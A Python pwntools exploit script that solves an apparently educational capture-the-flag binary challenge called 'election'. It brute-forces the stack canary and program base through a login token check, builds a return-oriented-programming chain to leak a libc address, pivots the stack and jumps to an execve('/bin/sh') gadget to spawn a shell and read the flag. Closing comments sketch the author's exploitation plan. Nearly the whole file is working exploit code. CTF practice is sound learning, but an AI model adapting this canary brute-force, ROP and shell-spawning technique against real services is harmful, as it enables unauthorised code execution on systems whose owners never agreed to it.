# coding=utf-8
from __future__ import print_function
from pwn import *

binary = './election'
context.binary = binary
# context.terminal = ['terminator', '-e']
p = remote('edu-ctf.csie.org', 10180)
# p = process(binary)
# gdb.attach(p, gdbscript='source ~/.gdbinit-gef.py')
b = ELF(binary)
l = ELF('./libc.so')


def login(token):
    p.sendafter('>\n', '1')
    p.sendafter('Token: ', token)
    return 'Invalid token' not in p.recvuntil('+')


def register(token):
    p.sendafter('>\n', '2')
    p.sendafter('token: ', token)


def vote(idx):
    p.sendafter('>\n', '1')
    p.sendafter('[0~9]: ', str(idx))


def say(idx, mesg):
    p.sendafter('>\n', '2')
    p.sendafter('[0~9]: ', str(idx))
    p.sendafter('Message: ', mesg)


def exit():
    p.sendafter('>\n', '3')


def bruteforce(pad, target):
    for i in range(8):
        while True:
            if login(pad+target[:i+1]):
                exit()  # logout
                print('sol:', target)
                break
            target[i] += 1


# gadgets
pop_rdi = 0x11a3  # pop rdi ; ret
pop_rsi_r15 = 0x11a1  # pop rsi ; pop r15 ; ret
ret = 0x906  # ret
leave_ret = 0xbe9  # leave ; ret
pop_rbp = 0xa40  # pop rbp ; ret

# ========== leak canary of `main` ==========
token = '\0'*(0xb8)  # sizeof(token)
canary = bytearray(8)

bruteforce(token, canary)  # bruteforce canary
p.success('canary -> 0x{:x}'.format(unpack(canary)))

# ========== leak PIE base  ==========
# bruteforce __libc_csu_init address on stack(rbp)
libc_csu_init = bytearray(8)
bruteforce(token+canary, libc_csu_init)

libc_csu_init = unpack(libc_csu_init)
p.success('__libc_csu_init -> 0x{:x}'.format(libc_csu_init))
image_base = libc_csu_init - b.sym.__libc_csu_init
p.success('image base -> 0x{:x}'.format(image_base))
b.address = image_base

# ========== leak libc base  ==========
token = flat(
    'a'*0x8,
    ret + image_base,  # points to ret
    'b'*0x8,
    pop_rdi + image_base,  # rdi = printf@GOT
    b.got['printf'],
    b.plt['puts'],
    b.sym.__libc_csu_init + 0x119a - 0x1140,  # pop rbx, rbp, ...
    0,  # rbx = 0
    1,  # rbp = 1 (jne not taken)
    b.sym.buf + 0x8,  # r12 = pointer to ret
    0,  # r13 (edi = r13d)
    b.sym.buf + 0x18 + 0x98,  # rsi = buf to write to,
    0x8,  # rdx = 8
    b.sym.__libc_csu_init + 0x1180 - 0x1140,  # mov rdx, r15, ...
    0,  # compensate for $rsp + 8
    0,  # rbx
    b.sym.buf + 0x98,  # rbp
    0,  # r12
    0,  # r13
    0,  # r14
    0,  # r15
    b.plt['read'],
    word_size=64
)

# to login, token == buf
payload = flat(
    '\0'*0xe8,
    canary,
    b.sym.buf - 8 + 0x18,  # saved rbp = ROP chain - 8
    leave_ret + image_base  # return address
)

votes = 0
while votes < 255:  # max votes
    register('a')
    login('a')
    for _ in range(10):
        if votes == 255:
            break
        vote(0)
        votes += 1
    exit()

p.success('votes reached 255!')
register(token)
login(token)
say(0, payload)
exit()

p.recvline_contains('>')
raw = p.recv(6)  # recv puts output
printf = unpack(raw.ljust(8, '\0'))
libc_base = printf - l.sym.printf
l.address = libc_base
p.success('libc base -> 0x{:x}'.format(libc_base))

# 0x10a38c execve("/bin/sh", rsp+0x70, environ)
# constraints:
#   [rsp+0x70] == NULL

payload = p64(libc_base + 0x10a38c)
print('sending:', repr(payload), hex(libc_base + 0x10a38c))
p.send(payload)

p.sendline('cat /home/election/flag')
p.interactive()
# rdi rsi rdx
# rax
# syscall
# rdi OK
# rsi OK
# ===================================
# msg is not initialized
# token is 0xb8 but buf is 0xc8
# variable length to write to msg -> maximum 255!!!!!!!

# memcmp -> canary + image base
# image base -> GOT
# vote -> gadget

# method 1
# ROP -> shell

# method 2
# ROP -> libc address
# libc address -> system('/bin/sh\0')

# // Normal Read
# read 0
# read 11 not taken
# read 15 syscall
# read 23 not taken // taken?
# read 25 repz ret
